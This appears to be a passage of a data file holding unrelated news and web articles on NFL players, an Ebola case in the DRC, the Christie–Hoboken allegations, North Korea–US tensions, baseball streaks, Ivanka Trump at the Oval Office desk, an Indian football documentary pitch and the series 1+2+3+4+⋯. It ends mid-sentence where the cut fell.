  "latent_24504": "The Indianapolis Colts are currently in their second week of OTAs, which provides the best opportunity to look at the team out of the offseason program.\n\nLast week, however, rookie cornerback Quincy Wilson missed Tuesday’s practice due to a foot injury, so the media wasn’t able to get a look at him. Wilson was back this week, however, and participated on Wednesday, and he made a very good first impression.\n\nThe Indianapolis Star’s Stephen Holder noted that on one play in the red zone Wilson had “tight coverage” on Donte Moncrief, while Wilson “could typically be found in good position against the Colts’ receivers.”\n\nThe Colts have also been impressed with Wilson, though Chuck Pagano made it clear that he’s not in football shape yet.\n\n“He’s working hard,” Pagano said yesterday. “He’s a smart football player. He gets it and he asks the right questions. I don’t think he’s anywhere near in the physical shape that he needs to be in. He understands that; he knows that. He’s working extremely hard to not only get the mental part down but to get himself in football shape to where you can run and cover, play the position that he has to play at an extremely high level. When you’re struggling physically, you’re trying to cover the guys he’s trying to cover out here, especially the veteran guys, it makes it difficult. It’s not only him, it’s all the young guys trying to adapt.”\n\nPart of that is I’m sure just due to being a rookie trying to get up to speed with the NFL game, and part of that also could be missing some time last week with his foot injury. But Wilson isn’t in the shape the Colts want him to be yet, so that’s certainly something to pay attention to moving forward. Assuming that he does get in shape, however, he’s a guy who could play a significant role for the Colts in 2017. Their second round pick figures to be the starting cornerback opposite of Vontae Davis, and he’s got a lot of potential to keep improving. He’s a physical corner with good ball skills who should help the Colts’ secondary out considerably. He won’t be perfect (and he knows that), but there’s still high hopes for his rookie season.\n\n“Being out here young, being a rookie, I understand that I’m going to get beat but I’m also going to make plays too,” Wilson said yesterday. “You’ve just got to keep your head high and always have confidence. If there’s no struggle, you don’t succeed so I’ve just got to keep my head up and keep grinding.”\n\nOne thing that he has noticed already just from practicing with the Colts is that the NFL game is much faster.\n\n“I would say it’s definitely faster,” he said. “Everything is coming at 100 miles an hour. Everybody is good. In college, you might have one good receiver but everyone out there is good and the quarterback is throwing the ball on point so that’s been pretty much the main difference from college.”\n\nThat probably plays into the importance of being in football shape too, as the game is faster and the players are better at the pro level. But the first impression he gave in practice yesterday certainly sounds positive, and now it’s up to him to keep working and get in NFL shape so that he lives up to his potential both as a rookie and moving forward.",

Out of the three deaths, one tested positive for Ebola.\n\nThe #Ebola case in the Democratic Republic of Congo was confirmed by a national reference laboratory in Kinshasa #DRC — WHO (@WHO) May 12, 2017\n\nThe cases were discovered in Aketi, a remote region without much access to health facilities, WHO communications officer Eugène Kabambi told HuffPost.\n\n“On the one hand, it’s lucky because the illness probably can’t spread on a wide scale. But on the other hand, it’s far from medical access,” he said.\n\nHe said his team is committed to controlling the outbreak and is working on “surveillance and prevention measures.” Anyone who has had contact with the suspected cases has to be monitored for a 21 days, Kabambi said. And community volunteers are educating people about proper hygiene, sanitation and consumption practices.\n\nThe virus can be spread through direct contact with blood or body fluids, objects like syringes or sexual contact. The average fatality rate for Ebola patients is about 50 percent, WHO reports.\n\n“It might be an outbreak of some significance or might be something that’s contained right away,” said Dr. Anthony Fauci, director of the National Institute of Allergy and Infectious Disease.\n\nThe country has “considerable experience” handling Ebola, he added. “They’re not neophytes when it comes to responding.”\n\nAnd an Ebola vaccine now exists. The Food and Drug Administration hasn’t approved it yet, but about 300,000 emergency doses of it could be made available in case of a large-scale outbreak in the DRC, the GAVI global vaccine alliance said Friday.\n\n“The fact that you have a vaccine just gives you an extra tool if you need to use it ― depends on how the situation evolves,” Fauci said. Continuous outbreaks like this one, he added, only underscore the importance of developing a vaccine to treat Ebola.\n\nThe Centers for Disease Control and Prevention has been briefed, according to a statement. “CDC ... stands ready to assist if needed with epidemiological or laboratory support,” the statement said. “CDC currently has staff in DRC working on a monkeypox vaccine trial that have been in contact with local health authorities about this situation.”\n\nMichaela Rehle / Reuters A volunteer wearing a protective suit walks in a \"high-risk\" zone during an Ebola training session held by Germany's Red Cross on Oct. 21, 2014.\n\nThe DRC has suffered a total of eight Ebola outbreaks since 1976, including one in August 2014 that resulted in 66 infections and at least 49 deaths. WHO declared an end to the outbreak in November of that year.\n\nThe worst Ebola outbreak in history occurred between 2013 and 2016. During that time, the illness killed more than 11,300 people in West Africa.\n\nTwo American health care workers were infected and became critically ill while working to treat patients in Liberia. The pair “almost surely would have died” had they not been airlifted to a special facility in Atlanta, The Washington Post reported.\n\nDonald Trump, who was not a politician at the time, called for them to be barred from returning to the U.S. while sick.\n\n“KEEP THEM OUT OF HERE!” he tweeted in July 2014, later adding: “People that go to far away places to help out are great-but must suffer the consequences!”\n\nThe White House did not respond to HuffPost’s request for comment.",

  "latent_24847": "Steve Kornacki, the latest source of misery for New Jersey Gov. Chris Christie, has been getting worried messages from relatives over the past few days.\n\n“My family has been sending me all sorts of texts about being careful,” the host of MSNBC’s weekend morning program, Up with Steve Kornacki, said on Monday. On Twitter, the National Journal’s Ron Fournier predicted--jokingly--that Kornacki “will be sitting all month in traffic.” And The Daily Kos’s Greg Dworkin, a Connecticut Democrat, tweeted mock-threateningly: “Nice cable show you got there, Steve. Shame if something happened to it.”\n\n“I haven’t really slept,” Kornacki told me. “I was going to sleep during the day, but now I’m not going to be able to. I’m still working the phones, trying to see what else is put out there--if there are any more angles in particular on this Christie story.”\n\nThe embattled governor and his administration were already facing multiple investigations over the politically vindictive George Washington Bridge traffic debacle last September as he was breezing to his landslide reelection. But Kornacki, 34, managed to increase Christie’s troubles significantly on Saturday with a blockbuster interview featuring Hoboken Mayor Dawn Zimmer, a Democrat who, until now, anyway, had been a conspicuous cheerleader of the Republican governor.\n\nOn Kornacki’s show, Zimmer accused Christie and his minions of refusing to release millions of dollars in Superstorm Sandy recovery aid to her flood-ravaged city on the banks of the Hudson River unless she fast-tracked approval and lucrative tax breaks for the construction project of a supremely well-connected real estate developer. She offered to take a lie detector test and testify under oath.\n\n“I wasn’t sure how much play it would get, but I knew it would cause a stir when I walked in Saturday morning to do the show,” Kornacki said about Zimmer’s allegations, which were supported by emails from lobbyists and New Jersey state officials and other apparently corroborative documents, including the mayor’s messily scribbled private diary. “I wasn’t sure how big it would be. I figured it would have an impact. It was a bigger impact than I expected.”\n\nKornacki’s scoop--obtained with help of New Jersey sources dating back to his years as a Hoboken resident and reporter for a political web site owned, serendipitously, by future Christie Port Authority appointee and bridge scandal principal David Wildstein--turned out to be explosive. It was front-paged in Monday’s New York Times and the mayor, after repeating her allegations Sunday on CNN, doubled down by telling her story to the U.S. Attorney in Newark.\n\nAlong with the bridge incident, it’s another active criminal investigation for federal prosecutors, and could potentially derail not only Christie’s governorship and his chairmanship of the Republican Governors Association, but also his plans to run for president in 2016.\n\nTeam Christie has reacted with a ferocity reserved for the deadliest of threats, impugning the “partisan” motives of Mayor Zimmer and MSNBC, denying her allegations about a quid pro quo, and trotting out Lt. Gov. Kim Guadagno--whom Zimmer identified in her diary and television appearances as the official who took her aside and strong-armed her in a Hoboken parking lot last May--to essentially call Zimmer a damned liar. This, in a press conference Monday at which Guadagno looked like she was making a hostage video and declined to take questions.\n\n“From the personal standpoint, the weird thing about all this is that I know so many of the players in this story so personally from my New Jersey days,” said Kornacki, who toiled for Wildstein’s web site, a precursor to PolitickerNJ, in the early 2000s. “This story is national in scope but involves relationships in Jersey that go back ten, twelve years. ‘Weird’ is one word to describe it. Professionally, it’s right-place, right-time.”\n\nDespite his Rolodex of Jersey connections, Kornacki didn’t know Zimmer. “I might have met her covering politics, but if I did I don’t remember,” he said. He first heard about her problems with the Christie administration early last week and made an appointment to see her in Hoboken, where she confirmed what he’d been hearing and offered up her documents.\n\nThe mayor dispatched an aide to take Kornacki on a tour of the proposed construction site in a warehouse district in the north part of town, where the Rockefeller Group, the venerable developer that built Manhattan’s Rockefeller Center, had purchased four acres and wanted substantial tax breaks to erect an office tower. The developer is represented by the powerful law firm of Christie ally David Samson, who also figures prominently in the GW Bridge traffic jam scandal as Christie’s hand-picked chairman of the Port Authority of New York and New Jersey.\n\nDespite intense lobbying--including, Zimmer alleged, from Christie’s commissioner of community affairs, Richard Constable--the desired tax breaks for the Rockefeller Group have not been forthcoming.\n\n“I saw the land in question, the development that was supposed to occur, and the mayor was willing to provide documents,” Kornacki told me. “So it was a process of getting those documents, and reviewing them. Also, she wasn’t entirely clear from the beginning that she wanted to come on the air and make the accusations. She wasn’t sure until Friday morning that she wanted to do it. We’d had a different show planned.”\n\nThere followed two meetings, totaling three hours, with MSNBC in-house lawyers and standards and practices staff. “I guess it was the longest meeting with lawyers I ever had in my life,” Kornacki said. “We wanted to make sure we were confident in the documents we had. We wanted to subject them to a lot of scrutiny on our end before it was something we aired. We wanted to be able to show the documents and we went through every assertion in her story.” Zimmer’s account, he added, “passes the plausibility test.”\n\nHer private diary was an especially compelling piece of evidence. “I think she was a little embarrassed about her handwriting and having it being seen on national television,” Kornacki said. “Obviously, we can’t do carbon dating on the pages to make sure that this was an authentic contemporaneous account in her diary, and we were trying to look for anything that could tip us off one way or the other on whether this was legitimate or not. The handwriting was one of the things that made it more authentic in our minds.”\n\nAfter the fateful encounter with Guadagno during a morale-boosting visit to a ShopRite store in Hoboken, Zimmer scrawled in her diary that the lieutenant governor pulled her aside “and says I need to move ahead with the Rockefeller project. It is very important to the governor. The word is you’re against it and you need to move it forward or we’re not going to be able to help you [with Sandy aid]. I know it’s not right. These things should not be connected but they are. If you tell anyone I said that, I will deny it.”\n\nNeedless to say, MSNBC has been touting Kornacki’s scoop in wall-to-wall coverage, and he appeared Monday night on All In with Chris Hayes to punctuate his journalistic coup.\n\n“I didn’t do it with the intent of ‘Let’s get Chris Christie. Wouldn’t it be great to see him fall?’ Or anything like that,” Kornacki told me. “We got a serious accusation and we found this story, and we’re not making a judgment that we guarantee that this is what happened.” He added that since the weekend, “I’ve been going back in my mind and a little bit this morning, just to make sure--running back the sequence of events, to make sure I feel good about putting it on the air. And I do.”",

  "latent_24898": "SEOUL (Reuters) - North Korea said on Monday it had told the United States it will cut the only channel of communication between them, at the United Nations in New York, after Washington blacklisted leader Kim Jong Un last week for human rights abuses.\n\nAll matters related to the United States, including the handling of U.S. citizens detained by Pyongyang, will be conducted under its “wartime law,” its official KCNA news agency said.\n\nThe move was the latest escalation of tension with the isolated nuclear-armed country, which earlier on Monday threatened a “physical response” after the United States and South Korea said they would deploy the THAAD missile defense system in South Korea.\n\nNorth Korea said last week it was planning its toughest response to what it deemed a U.S. “declaration of war” after Washington announced sanctions on Kim Jong Un.\n\nA U.S.-based North Korea monitoring project, 38 North, said on Monday that satellite images from July 7, a day after the sanctions announcement, showed a high level of activity at North Korea’s nuclear test site, but it is unclear whether this was for maintenance or preparation for a fifth nuclear test.\n\n“As the United States will not accept our demand for the immediate withdrawal of the sanctions measure, we will be taking corresponding actions in steps,” KCNA said on Monday.\n\n“As the first step, we have notified that the New York contact channel that has been the only existing channel of contact will be completely severed,” it said.\n\n“The Republic will handle all matters arising between us and the United States from now on under our wartime laws, and the matters of Americans detained are no exception to this.”\n\nU.S. State Department spokesman John Kirby declined to comment specifically on the North Korean statement but said such rhetoric “obviously is not doing anything to ease tensions.”\n\nTwo Americans are currently known to be detained in North Korea. Otto Warmbier, a University of Virginia student, was sentenced in March to 15 years of hard labor for trying to steal an item with a propaganda slogan and Korean-American Kim Dong Chul is serving a 10-year sentence for espionage, according to North Korean state media.\n\nKirby repeated a call for North Korea to release the Americans from “improper and unjust detention” and stressed the need for it to adhere to its Vienna Convention commitment to allow consular access.\n\nNorth Korea has previously indicated that wartime laws would mean detainees will not be released on humanitarian grounds.\n\n‘BARGAINING CHIPS’\n\nThis could delay release of the Americans, giving North Korea one of its last bits of leverage in negotiations with the United States, said T. Kumar, Amnesty International USA’s international advocacy director.\n\n“The tension is at one of the highest levels now, and one of the areas they have control over is with the detainees,” Kumar said. “They will use them as bargaining chips to get some advantages.”\n\nKumar said he did not think the prisoners would be affected in other significant ways.\n\nNorth Korea and the United States remain technically at war because the 1950-53 Korean War, in which Washington sided with South Korea, ended only with a truce.\n\nThe so-called New York channel, via North Korea’s mission to the United Nations, has been an intermittent point of contact between North Korea and the United States, which do not have diplomatic relations.\n\nIt has been used in the past to exchange messages and to hold discussions, including over detainees held by North Korea. However, the release of past U.S. detainees has generally come only after visits to Pyongyang by high-profile U.S. leaders, including former Presidents Bill Clinton and Jimmy Carter and Director of National Intelligence James Clapper.\n\nWarmbier’s mother, Cynthia, declined to comment when reached by telephone on Monday.\n\nOtto Frederick Warmbier (C), a University of Virginia student who was detained in North Korea since early January, is taken to North Korea's top court in Pyongyang, North Korea, in this photo released by Kyodo March 16, 2016.

  "latent_25070": "In 2013, the Arizona Cardinals won 10 games, finishing third in the NFC West and narrowly missing the playoffs.\n\nIn 2014 they won 11 games, finishing second in the NFC West and reaching the postseason.\n\nWhat’s in store for them in 2015?\n\nSome people see the return to health for many of the team’s key players, including quarterback Carson Palmer, means the Cardinals will look more like the squad that won nine of its first 10 games rather than the one that lost five of its last seven, including a playoff loss to Carolina.\n\nOthers look at the Cardinals and feel like they are due for a step or two back, that the brutal NFC West will prove to be too much for Bruce Arians’ team.\n\nObviously, no one really knows how the Cardinals will fare in 2015. But when trying to project how they will do, ESPN.com’s Aaron Schatz, in an Insider piece, says the Football Outsiders algorithm has Arizona looking more like the second, less appealing option.\n\nAccording to the projection, with a notation that things can change between now and the start of the season, the Seattle Seahawks will win the division at 12-4, with the San Francisco 49ers coming in second at 7-9. The Cardinals and St. Louis Rams, it says, will finish with 6-10 records.\n\nHere’s the explanation for the Cardinals’ disappointing prediction:\n\nThere are also a number of questions revolving around the projection for the Arizona Cardinals. We might be forecasting their defense as too strong because of the importance of departed defensive coordinator Todd Bowles. We also might be forecasting their offense as too weak because the system doesn’t fully compensate for the drop in Arizona’s offense when the Cardinals were forced to start a quarterback, Ryan Lindley, who wasn’t on their roster to start the season. On the other hand, Arizona ranked 23rd in offensive DVOA, if we count all 16 games. If we only count games started by Carson Palmer, the Cardinals would have ranked … 23rd, in exactly the same place except a little closer to No. 22 Minnesota. Arizona’s overall performance was weak for a playoff team even before Lindley took over as quarterback, and teams like that tend to decline. On the other hand — back to the subjective questions about head coaches — Bruce Arians’ record of outperforming statistics over the past three seasons is extremely strong.\n\nIndeed, the Cardinals may be one of the most difficult teams to peg because the team that finished last season is not at all the same as the one that started it.\n\nThen again, Arizona won a lot of games it trailed late, rarely dominating any of its opponents. Is that a sign of a team that simply knows how to win, or is it an indication that maybe the Cardinals weren’t that much better than the teams they beat and thus, are ripe for regression?\n\nThe regular season opener against the New Orleans Saints is four months away, so it will be a while before we find out.",
  "latent_25216": "Streaks can be maddening or joyful, depending on which side of the coin your allegiance happens to lie. When it happens to players, we say the player is hot or in a slump. He might be performing better or worse for a particular reason — like good health or lack thereof — but, often, it’s just the product random variation over a long season.\n\nFor teams, the situation is a bit different. If a player goes 2-for-4, that’s good and potentially part of a hot streak. A team, however, can record only a win or a loss. Long winning or losing streaks are fairly rare. Only the Indians and Cubs have managed winning streaks of at least 10 games this season — and the only double-digit losing streaks this season have come from the Cincinnati Reds, Los Angeles Angels, and Tampa Bay Rays. Good teams tend to rack up winning streaks; bad teams, losing streaks. If you want to get somebody who can do both, however, look no further than the Detroit Tigers.\n\nThat win streaks translate to season-long success is probably not news. As the graph below confirms, going on win streaks leads to a lot of wins in general. (Data from Baseball Reference.)\n\nThat’s a rough look at the standings, although Detroit might be a bit higher than their wins suggest and the Mets and Marlins have had difficulty pulling off a run despite solid overall records. And poor San Diego: the Padres have yet to pull off a single four-game win streak all season.\n\nOf course, having win streaks just means you are a winning team. The chart below looks at the percentage of wins within a streak that a team compiled compared to their total wins.\n\nWhile the Cubs have recorded the most toal wins from streaks, at 42 — and the Rangers are second at 41 — the Tigers have produced the greatest percentage of their wins during the course of win streaks. Those win streaks are just half of the streakiness equation. There are the losses, too. The graph below shows the teams with the most losing streaks of at least four games.\n\nWe see essentially the reverse of the graphs from above, with the good teams now occupying the right side of the graph; the bad teams, the left side. The Braves have as many losing streaks of at least four games as the Indians, Marlins, Red Sox, Cardinals, Dodgers, and Blue Jays combined. The Royals and the Pirates, two teams that have struggled at times, but are not out of the playoff race yet, both have six losing streaks this season. The Tigers aren’t too far behind. As a percentage of losses, the Braves still take the top spot.\n\nDetroit, Kansas City, and Pittsburgh are among those winning teams whose losses have tended to come in bunches. Kansas City hasn’t quite felt the same streakiness from the winning side, as the team is closer to the middle of the pack. The Pirates are one of just two teams who’ve recorded more than 40% of their wins and 40% of their losses coming from streaks as they have 26 wins and 26 losses on streaks this year. You might say they’re the most consistently streaky. The other team is the aforementioned Detroit Tigers, who have a greater percentage of their wins come from streaks than any team and also managed to stay in the top half on the losses side. Aside from the Atlanta Braves, who are just streaky-bad, no team has had more games this season occur during a winning or losing streak.\n\nAmong winning teams, the gap between the Tigers and Cubs is quite large, greater than the gap between the fourth-place Cubs and the San Francisco Giants, who come in 15th here. On the other end of the spectrum, the Marlins are the least streaky team in baseball. They’re the only team with fewer than 25% of both of their losses and wins coming from streaks. The Brewers, Cardinals, and Yankees are the only teams under 30% in both categories.\n\nThere doesn’t appear to be a common theme between the teams grouped together. Jose Fernandez appears to be the type of pitcher who might help prevent longer losing streaks, while some of the rest of the staff might prevent win streaks. The Cardinals have had an inconsistent bullpen, while the Yankees had a great one. The Brewers and Padres are bad, even as many other teams without many streaks are very good. I’m not sure there’s too much here to identify the types of teams that might be prone to winning streaks or losing streaks or both other than being good, bad, and mediocre. On the other hand, if you want to know if the streaks matter, they do.\n\nCommon wisdom would indicate that putting together as many winning streaks as possible and limiting losing streaks is a good way to get to a lot of wins. Vice versa in terms of losses. However, these streaks amount to only around 35% of a team’s games. I was curious whether what happened in those 35% of games was a good indicator of what might be happening in the rest of the games. To determine if there was a relationship and how strong that relationship might be, I put together a streak percentage.\n\nA team’s streak percentage is relatively simple: games in winning streaks minus games in losing streaks, with the total divided by total games. The chart looks like this:\n\nStreak Percentage Streak Wins/G Streak Losses/G Streak % Indians 26.19% 0.00% 26.19% Cubs 33.33% 10.32% 23.02% Rangers 32.03% 9.38% 22.66% Red Sox 19.69% 3.15% 16.54% Nationals 26.77% 11.81% 14.96% Blue Jays 21.26% 7.09% 14.17% Dodgers 21.26% 7.87% 13.39% Orioles 27.56% 14.17% 13.39% Tigers 31.50% 18.90% 12.60% Astros 22.05% 10.24% 11.81% Marlins 11.81% 3.15% 8.66% Cardinals 15.08% 7.14% 7.94% Giants 22.83% 14.96% 7.87% Yankees 15.08% 14.29% 0.79% Pirates 20.80% 20.80% 0.00% White Sox 15.08% 16.67% -1.59% Mets 13.39% 15.75% -2.36% Mariners 14.17% 18.11% -3.94% Royals 18.90% 22.83% -3.94% Rockies 14.17% 18.11% -3.94% Phillies 14.17% 18.90% -4.72% Brewers 9.45% 14.17% -4.72% Angels 14.17% 25.20% -11.02% Diamondbacks 14.84% 26.56% -11.72% Rays 15.87% 28.57% -12.70% Reds 7.14% 23.81% -16.67% A’s 11.81% 29.92% -18.11% Twins 9.45% 33.07% -23.62% Padres 0.00% 26.77% -26.77% Braves 10.94% 40.63% -29.69%\n\nAs for how it relates to win percentage overall, the relationship is incredibly strong as seen by this graph.\n\nFor comparison’s sake, that is a slightly stronger relationship than current PythagenPat win percentage (r^2= .80) or BaseRuns win percentage (r^2= .70). While those other two are likely a better representation of how a team played than a team’s actual record, at least for this season, a team’s streak percentage will likely tell you a bit more about a team’s actual record. The use of this might be limited given finding out a team’s actual record is incredibly easy, but this does suggest that streaks do matter over the course of a season.",

To her right was her father, the president of the United States. To her left was Canadian Prime Minister Justin Trudeau.\n\n“A great discussion with two world leaders about the importance of women having a seat at the table!” Ivanka Trump tweeted, appending the simple caption with American and Canadian flag emoji.\n\nThe sentence was a nod to the roundtable discussion on women in the workforce the first daughter had participated in earlier that day as part of Trudeau's visit. But critics immediately zeroed in on the fact that Trump had taken a seat not just at any table, but one normally reserved for the president.\n\n“Trump ! please respect the Oval Office ! Please !\" one Instagram user begged.\n\n“lord, how many 'bring your daughter to work' days is this administration going to have?” another Twitter user responded.\n\nAmid the backlash, people clashed over whether it was appropriate for Trump, whose family's role in the White House has already raised eyebrows, to be photographed at the Oval Office desk. Many defended it as “a photo op, nothing else.” A few of her supporters tried to read into what the photo said about Trump's future.\n\n“Ivanka I hope you run for office someday, you should b [sic] the first woman president!!\" one Facebook user wrote.\n\nThe White House did not immediately respond to an email request for comment Tuesday morning.\n\nThe Oval Office has seen its fair share of desk-related kerfuffles, as well as plenty of accusations that its occupant at any given time is “disrespecting” the venerable office. In most instances, the outrage and those defending against the outrage cleave along party lines.\n\nWhen President Barack Obama was photographed with his foot on the Oval Office desk, it sent “shockwaves around the world,” a breathless Washington Times headline declared then. One critic accused him of “desecrating” the office, a claim that Snopes dismantled after unearthing photos of former presidents George W. Bush and Gerald Ford similarly propping their feet on the desk.\n\nObama had also been accused of not “respecting” the office enough after he did away with a dress code that required people to wear a coat and tie in the Oval Office. Andrew Card, a former White House chief of staff to Bush, complained about the relaxed sartorial rules on a conservative radio talk show during the first month of Obama's presidency.\n\nThe Bushes, along with President Ronald Reagan, had “treated the Oval Office with tremendous respect,” which was reflected in how they expected people to dress, he said. “I’m disappointed to see the casual, laissez-faire, short sleeves, no shirt and tie, no jacket, kind of locker room experience that seems to be taking place in this White House and the Oval Office,” Card said disapprovingly of Obama.\n\nHowever, Card failed to recognize that Reagan had certainly been photographed without a jacket during his tenure.\n\nAs far as precedent goes, Ivanka Trump has certainly not been the first non-president to have taken a seat at the Oval Office desk.\n\nRobby Novak, a.k.a. “Kid President,” feigns a phone call at the Resolute Desk during his visit to see President Barack Obama in the Oval Office on April 1, 2013. (Pete Souza/White House)\n\nIn 2013, 9-year-old Robby Novak — better known as “Kid President,” a precocious Internet personality who recorded videos from his cardboard version of the Oval Office — visited the White House to meet Obama, who gave him a tour of the real Oval Office.\n\n“Cool!” was Robby's initial reaction.\n\n“I think you should try to sit behind the desk, so you look a little more official,” Obama told him.\n\nRobby, in a suit and tie, was recorded sitting in Obama's chair and at one point picked up one of the president's landlines.\n\n“Is anybody on there?” Obama asked the boy, half-jokingly. “Let's make sure not to cause an international incident.”\n\nAnd, of course, the young children of former presidents famously have been pictured playing beneath the Oval Office desk.\n\nWashington Post reporter Krissah Thompson examines the role President Trump's eldest daughter played during the campaign and what she could do in the future.

  "latent_25586": "About\n\nJuly 25, 2012, Colombo, Sri Lanka: It is a blisteringly hot day at Sugathadasa Stadium as Amit \"Happy\" Lochab steps on the field for the first ever professional American Football game in South Asia; he has come a long way at this point. The field where he learned to play this game was one built with his own two hands. Happy is the leader of his team, the Delhi Defenders, and when they didn't have a field to practice on, he gathered his villagers and teammates, borrowed a tractor, and spent day and night clearing the field, laying grass down, and painting lines on it. Of course, the field could never be complete without one final touch: stamping DEFENDERS across the end zone. Happy grew up poor in Auchandi Village. Just 11 months ago he picked up a football for the first time. But now, Happy is moments away from making history.\n\nWhat is this film about?\n\nTHE LEAGUE\n\nWhat if America’s most popular sport was introduced to the world’s second most populous nation?\n\nBirth of a Sport will be a feature documentary chronicling the Elite Football League of India (EFLI), the first professional American football league in India, Pakistan and Sri Lanka. Founded in late 2011, the EFLI was started to create new opportunities for athletes in the region. The first season began just about a year later and is being broadcast throughout South Asia on one of the leading sports networks, Ten Sports. The league consists of eight teams, five located in various cities across India, two in Sri Lanka, and one from Pakistan. There are some big names behind the league, including NFL Hall of Fame members Kurt Warner, Mike Ditka and Michael Irvin, as well as Hollywood superstar Mark Wahlberg.\n\nCricket rules in this region and nothing comes close. That means the one billion plus people who populate this vast land only consume one sport. What about other athletes? These other sportsmen have unquestionable skills. But let's face it, some people are more fit to tackle a running back than bowl to a batsman.\n\nINDIA vs. PAKISTAN: THE RIVALRY\n\nWith 111 million television viewers, the 2012 Super Bowl was the most watched show in US history. By contrast, a 2011 India-Pakistan cricket match was estimated to attract an audience of over 500 million.\n\nThe history between India and Pakistan is long, documenting a relationship colored by infamous complexity. India and Pakistan were, at one time, a single country under British rule. In 1947 Britain dismantled its Indian Empire and partitioned the sub-continent, creating a fierce South Asian rivalry, which has lasted ever since. The roots of this animosity stem from religious difference and even further conflict over the states of Jammu and Kashmir. Recently, this conflict has escalated into a frightening nuclear arms race.\n\nThis rivalry isn't constrained to just geopolitical affairs. The competition between the national cricket teams of India and Pakistan is one of the most intense sports rivalries in the world. A standard India-Pakistan cricket match attracts hundreds of millions of viewers, and defeat is just plain unacceptable to fans of both teams.\n\nThe EFLI is hoping to bring these two countries together in peace through this vicious contact sport. Can players from these two countries, competing with the same goal of demolishing each other on the field, come together as brothers off of it? Birth of a Sport will chronicle this as it’s happening.\n\nTHE PLAYERS\n\nThe true heart of this film rests in the personal stories of players and coaches. India is an extremely diverse place with a centuries old caste system; the players from this league come from all over, they speak one of hundreds of different languages and represent many of the thousands of different castes.\n\nThere are players coming from the slums, looking to bring a better life to their families. Then there are those from well-off backgrounds, looking to make a name for themselves in the world of sport. Some left decent jobs, others good schools, but all of these men are risking their livelihoods to become EFLI stars.\n\nWho are we and why are we making this film?\n\nEvan Rosenfeld and Jenna Moshell worked together at a Miami-based documentary studio, rakontur, before setting out on their own.\n\nEvan Rosenfeld (Director/Producer) is an experienced documentary film producer who has worked on multiple sports related films. His most recent film, Broke, premiered at Tribeca Film Festival and made its television debut on October 2nd, 2012 as a part of ESPN's \"30 for 30\" series, becoming the highest rated film in the critically acclaimed Peabody Award winning series. This was his second project for ESPN, the first of which, The U, also debuted with record breaking ratings. Evan is the Executive Producer of Life and Freaky Times of Uncle Luke, which premiered at the 2012 Sundance Film Festival. Evan has also worked as a producer on the Cocaine Cowboys film series.\n\nJenna Moshell (Producer) is a seasoned producer and production manager. She has worked on a slew of documentaries including The U and Broke, both part of ESPN's \"30 for 30\" series; Limelight, which premiered at the 2011 Tribeca Film Festival and currently runs on Showtime; Square Grouper, which premiered at the 2011 SXSW Film Festival and is also currently on Showtime.\n\nWhat have we done already?\n\nWe have already shot a large amount of incredible footage for our documentary. We were able to shoot training camps before the EFLI season took off, and even better, we were fortunate enough to shoot the entire, first ever, American football season in Asia. We followed specific teams and players on this journey, and have captured both heartwarming and heartbreaking stories throughout this process.\n\nWe've also produced short documentaries on each team in the league. Here is the piece on the Kolkata Vipers:\n\nTo view more go here: EFLI Team Profiles\n\nWhat do we still need?\n\nWe have already filmed the vast majority of this documentary. We need the funds to:\n\nCOMPLETE PRODUCTION:\n\n-Take one more trip to India to follow up with the players.\n\n-Take a trip to Pakistan. Visiting the Wolfpak players at home, we will be able to join them as they recruit new players.\n\nPOST PRODUCTION:\n\n-Editing\n\n-Post Sound\n\n-Motion Graphics\n\n-Music\n\n-Color Correction\n\n-Post, Marketing, Festivals, etc.\n\nA message from Evan Rosenfeld (Director/Producer):\n\nIt was the experience of a lifetime to be a part of the first season of the EFLI. Seeing the heart and passion invested at all levels, from everyone involved, was nothing short of incredible. The players dedicated everything they have to learning this sport with the utmost skill and expertise. After observing even one season, there is no question that they have done exactly that. The high paced action, vicious tackles, and amazing catches come together for one purpose; this league put an unquestionably entertaining product on some of the most surprising fields.\n\nIt was a pleasure to capture this first season on film. Each and every team had the same, astonishing level of passion, but they are all unique and special. We are thankful for the welcome we received from all of the groups, and even more so, that we were able to witness and experience the bonds each team had. Whether it was waking up with the Mumbai Gladiators at 5AM, singing and dancing on the team bus with the Bangalore Warhawks, or spending Independence Day with the Pakistan Wolfpak, all of the teams made us feel like a part of their families. We hope the people who see this film will witness the unique bonds that color these connections, and we hope viewers will get to know the very special players, who comprise the heart and persistent fervor of the EFLI.\n\nIf we were able to capture just a small part of what we witnessed, then the world will see, just as we have, how huge this league will become.\n\nPrizes:",

The nth partial sum of the series is the triangular number\n\n∑ k = 1 n k = n ( n + 1 ) 2 , {\\displaystyle \\sum _{k=1}^{n}k={\\frac {n(n+1)}{2}},}\n\nwhich increases without bound as n goes to infinity. Because the sequence of partial sums fails to converge to a finite limit, the series does not have a sum.\n\nAlthough the series seems at first sight not to have any meaningful value at all, it can be manipulated to yield a number of mathematically interesting results. For example, many summation methods are used in mathematics to assign numerical values even to a divergent series. In particular, the methods of zeta function regularization and Ramanujan summation assign the series a value of − 1/12, which is expressed by a famous formula,[2]\n\n1 + 2 + 3 + 4 + ⋯ = − 1 12 , {\\displaystyle 1+2+3+4+\\cdots =-{\\frac {1}{12}},}\n\nwhere the left-hand side has to be interpreted as being the value obtained by using one of the aforementioned summation methods and not as the sum of an infinite series in its usual meaning. These methods have applications in other fields such as complex analysis, quantum field theory, and string theory.[3]\n\nIn a monograph on moonshine theory, Terry Gannon calls this equation \"one of the most remarkable formulae in science\".[4]\n\nPartial sums [ edit ]\n\nThe first six triangular numbers\n\nThe partial sums of the series 1 + 2 + 3 + 4 + 5 + 6 + ⋯ are 1, 3, 6, 10, 15, etc. The nth partial sum is given by a simple formula:\n\n∑ k = 1 n k = n ( n + 1 ) 2 . {\\displaystyle \\sum _{k=1}^{n}k={\\frac {n(n+1)}{2}}.}\n\nThis equation was known to the Pythagoreans as early as the sixth century BCE.[5] Numbers of this form are called triangular numbers, because they can be arranged as an equilateral triangle.\n\nThe infinite sequence of triangular numbers diverges to +∞, so by definition, the infinite series 1 + 2 + 3 + 4 + ⋯ also diverges to +∞. The divergence is a simple consequence of the form of the series: the terms do not approach zero, so the series diverges by the term test.\n\nSummability [ edit ]\n\nAmong the classical divergent series, 1 + 2 + 3 + 4 + ⋯ is relatively difficult to manipulate into a finite value. Many summation methods are used to assign numerical values to divergent series, some more powerful than others. For example, Cesàro summation is a well-known method that sums Grandi's series, the mildly divergent series 1 − 1 + 1 − 1 + ⋯, to ​1⁄ 2 . Abel summation is a more powerful method that not only sums Grandi's series to ​1⁄ 2 , but also sums the trickier series 1 − 2 + 3 − 4 + ⋯ to ​1⁄ 4 .\n\nUnlike the above series, 1 + 2 + 3 + 4 + ⋯ is not Cesàro summable nor Abel 